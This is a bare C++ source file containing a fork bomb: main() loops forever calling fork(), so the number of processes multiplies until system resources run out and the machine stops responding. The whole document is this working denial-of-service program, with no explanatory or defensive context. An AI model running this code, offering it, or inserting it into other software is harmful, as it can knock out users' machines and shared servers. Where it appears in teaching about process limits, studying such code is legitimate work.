#include <cstdio>
#include <unistd.h>
#include <cstdlib>
#include <iostream>
#include <sys/wait.h>

using namespace std;

int main()
{
	while (1)
		fork();
	return 0;
}

